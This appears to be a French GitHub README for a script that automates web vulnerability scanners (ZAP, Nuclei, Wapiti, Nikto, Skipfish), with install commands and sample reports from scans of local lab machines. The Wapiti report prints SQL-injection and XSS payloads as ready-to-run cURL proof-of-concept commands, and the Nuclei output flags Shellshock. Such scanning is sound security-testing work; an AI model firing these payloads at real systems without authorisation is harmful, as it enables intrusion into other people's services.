# ![metaWeb_zeus](https://github.com/user-attachments/assets/794ab03e-834b-4c7f-b6fd-407c2b281135)



Automatisation des scanner de vulns

<span style="color: #dddddd;">⚡</span> ZAP-OWASP --> https://www.zaproxy.org  
<span style="color: #dddddd;">⚛️</span> Nuclei --> https://github.com/projectdiscovery/nuclei  
<span style="color: #dddddd;">🐂</span> Wapiti --> https://wapiti-scanner.github.io  
<span style="color: #dddddd;">👽</span> Nikto --> https://cirt.net/nikto2  
<span style="color: #dddddd;">🐟</span> Skipfish --> https://github.com/spinkham/skipfish

# <span style="color: #dddddd;">🔧</span> Installation d'outils & emoji

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $ sudo apt install skipfish wapiti zaproxy nikto nuclei fonts-noto-color-emoji
```

# ⚠️ Script ZAP
A modifier selon votre installation

```
# ZAP-OWASP a ajuster 
ZAP_cmd() {

    echo -ne "${VERT}[+]${RESET} ${BLANC}Scan ZAP${RESET} ${VERT}${IP}${RESET}..."
    sh ZAP_2.16.0/zap.sh -cmd -quickurl http://${IP} -quickout $HOME/${name}/ZAP/${name}-rapport.html -quickprogress > /dev/null 2>&1
    #/usr/share/zaproxy/zap.sh -cmd -quickurl http://${IP} -quickout $HOME/Documents/${name}/ZAP/${name}-rapport.html -quickprogress > /dev/null 2>&1
    echo -e "${JAUNE}100%${RESET}"
}
```

# 👁️ Demo

https://github.com/user-attachments/assets/a2b18531-d7f0-432f-8392-b6a1c98fe501

# Rapports

⚡ ZAP

<img width="1920" height="1026" alt="zap-rapport" src="https://github.com/user-attachments/assets/7fffae02-2958-4448-a499-b84e34fc1533" />

⚛️ Nuclei

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $cat metaWeb/Sumo/nuclei/Sumo-rapport.txt
[CVE-2014-6271] [http] [critical] http://192.168.56.253/cgi-bin/test [paths="/cgi-bin/test"]
[waf-detect:apachegeneric] [http] [info] http://192.168.56.253
[ssh-auth-methods] [javascript] [info] 192.168.56.253:22 ["["publickey","password"]"]
[ssh-diffie-hellman-logjam] [javascript] [low] 192.168.56.253:22
[ssh-weak-mac-algo] [javascript] [low] 192.168.56.253:22
[ssh-weak-algo-supported] [javascript] [medium] 192.168.56.253:22
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.56.253:22
[ssh-cbc-mode-ciphers] [javascript] [low] 192.168.56.253:22
[ssh-server-enumeration] [javascript] [info] 192.168.56.253:22 ["SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10"]
[ssh-password-auth] [javascript] [info] 192.168.56.253:22
[ssh-weakkey-exchange-algo] [javascript] [low] 192.168.56.253:22
[options-method] [http] [info] http://192.168.56.253 ["GET,HEAD,POST,OPTIONS"]
[apache-detect] [http] [info] http://192.168.56.253 ["Apache/2.2.22 (Ubuntu)"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.56.253
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.56.253
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.56.253
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.56.253
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.56.253
```

🐂 Wapiti

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $cat metaWeb/Vicnum/wapiti/Vicnum-rapport.txt
********************************************************************************
                     Wapiti 3.0.4 - wapiti.sourceforge.io
                      Rapport pour http://192.168.56.99/
                Date du scan : Sat, 15 Feb 2025 23:30:11 +0000
                          Portée de ce scan : folder
********************************************************************************

Résumé des vulnérabilités :
---------------------------
                                                      Copie de sauvegarde :   0
                                                 Injection SQL en aveugle :   1
                                                     Identifiants faibles :   0
                                                           Injection CRLF :   0
               Configuration de la stratégie de securité du contenu (CSP) :   1
                                               Cross Site Request Forgery :   0
                                        Fichier potentiellement dangereux :   0
                                                    Exécution de commande :   0
                                                    Traversée de dossiers :   0
                                                Contournement de htaccess :   0
                                                      HTTP Secure Headers :   4
                                                     HttpOnly Flag cookie :   0
                                                            Open Redirect :   0
                                                       Secure Flag cookie :   0
                                                            Injection SQL :   1
                                              Server Side Request Forgery :   0
                                                     Cross Site Scripting :   2
                                                      XML External Entity :   0
********************************************************************************

Injection SQL en aveugle
------------------------
Vulnérabilité d'injection SQL en aveugle via une injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%27+or+sleep%287%29%231
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=%27+or+sleep%287%29%231""

                                  *   *   *

********************************************************************************

Configuration de la stratégie de securité du contenu (CSP)
----------------------------------------------------------
CSP n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

********************************************************************************

HTTP Secure Headers
-------------------
L'entête X-Frame-Options n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête X-XSS-Protection n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête X-Content-Type-Options n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête Strict-Transport-Security n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

********************************************************************************

Injection SQL
-------------
Injection SQL (DMBS: MySQL) via une injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=default%C2%BF%27%22%28
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=default%C2%BF%27%22%28""

                                  *   *   *

********************************************************************************

Cross Site Scripting
--------------------
Vulnérabilité XSS trouvée via l'injection dans le paramètre player
Evil request:
    POST /cgi-bin/vicnum1.pl HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%3CScRiPt%3Ealert%28%27wrvy2bqhzw%27%29%3C%2FsCrIpT%3E&admin=N
PoC en commande cURL : "curl "http://192.168.56.99/cgi-bin/vicnum1.pl" -e "http://192.168.56.99/" -d "player=%3CScRiPt%3Ealert%28%27wrvy2bqhzw%27%29%3C%2FsCrIpT%3E&admin=N""

                                  *   *   *

Vulnérabilité XSS trouvée via l'injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%3CScRiPt%3Ealert%28%27wx9h6utjyu%27%29%3C%2FsCrIpT%3E
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=%3CScRiPt%3Ealert%28%27wx9h6utjyu%27%29%3C%2FsCrIpT%3E""

                                  *   *   *

********************************************************************************

Résumé des anomalies :
----------------------
                                                Erreur interne au serveur :   0
                                       Consommation anormale de ressource :   0
********************************************************************************
Résumé des informations complémentaires :
-----------------------------------------
                                               Technologie web identifiée :   0
********************************************************************************
```
